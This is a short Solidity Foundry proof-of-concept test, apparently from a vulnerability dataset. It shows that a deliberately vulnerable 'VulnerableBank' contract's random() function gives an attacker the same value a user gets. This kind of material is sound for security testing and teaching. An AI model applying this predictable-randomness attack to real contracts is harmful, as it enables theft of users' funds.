// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "./basetest.sol";
import "../src/dac4f90e-4c72-4947-a0c9-078502a6a6db_VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        vm.deal(attacker, 10 ether);
    }

    function testDemonstration() public balanceLog {
        uint256 attackerRandom = target.random{value: 1 ether}();
        uint256 userRandom = target.random{value: 1 ether}(msg.sender);

        assertEq(attackerRandom, userRandom);
    }
}